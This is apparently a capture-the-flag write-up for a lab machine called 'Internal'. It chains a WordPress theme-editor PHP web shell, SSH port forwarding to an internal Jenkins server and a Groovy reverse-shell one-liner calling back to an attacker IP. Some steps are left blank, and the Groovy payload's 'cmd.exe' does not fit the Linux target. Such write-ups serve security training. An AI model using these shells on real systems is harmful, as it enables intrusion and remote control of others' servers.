# Internal

The lead is a straight forward exploit of Wordpress, followed by exploitation that requires manual enumeration of 
the host file system. A Jenkins server is found running internally that leads to a Docker container, to a ...

Add target IP address to `/etc/hosts`, mapped to `internal.thm`.

## Scanning

Run a simple port scan (without Ping)

	nmap -Pn -p- <IP target> -oN portscan

portscan:

## Reverse shell

| ![Wordpress login succeed](/_static/images/Screenshot from 2022-10-03 02-30-05.png) |
|:--:|
| Log into WordPress as the admin user. |

Copy and adapt the Laudanum PHP Reverse Shell found in `/usr/share/laudanum/php/php-reverse-shell.php` or the 
[PentestMonkey php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

| ![Wordpress login succeed](/_static/images/Screenshot from 2022-10-03 02-33-24.png) |
|:--:|
| Change IP address and port |

1. Use "Appearance > Theme Editor > 404.php" and replace the PHP code with the PHP reverse shell.
2. Open a listener
3. Call the template in browser 
[http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php](http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php)

A shell as the `www-data` user is granted on the box.

```

Stabilise the shell:

    python -c "import pty;pty.spawn('/bin/bash')"

Explore to find an interesting file in the `/opt` directory. Read it.
The user flag is in aubreanna’s home folder. 

## Privilege escalation

MySQL credentials can often be found by inspecting the `wp-config.php` file. Alas.

Log in as the aubreanna user via SSH:

    ssh aubreanna@internal.thm

Check for sudo privileges:

    sudo -l
    Sorry, user aubreanna may not run sudo on internal.

There is a file in aubreanna’s home folder that tells us Jenkins is running on port 8080:

    netstat -tan | grep 8080

There already were indications that docker is available on the target, and Jenkins is often installed with docker.
If not a rabbit hole, this could be a way to elevate privileges to root. 

## Using SSH for port forwarding

Because port 8080 can only be accessed locally, we need to set up port forwarding to redirect traffic to localhost 
on port 1234 to the target machine on port 8080. On the attack machine:

```text
$ ssh -f -N -L 1234:127.0.0.1:8080 aubreanna@internal.thm
aubreanna@internal.thm's password: 
```

Check results:

Log in to Jenkins with the found username and password.

## Reverse shell in docker

Start a listener:

    sudo nc -nlvp 5555

In Jenkins, go to "Manage Jenkins > Script Console". Enter (change the necessary parameters) this awesome code from 
[Abusing Jenkins Groovy Script Console to get Shell](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6):

```text
String host="10.9.1.53";

int port=5555;

String cmd="cmd.exe";

Process p=new 
ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And execute. In the listener, we now have a reverse shell in docker. In `/opt` is a message 
`note.txt` for Aubreanna. :)

Go back to the initial SSH connection as aubreanna, and get the root flag:

    $ su root
    Password: 
    # cd /root/
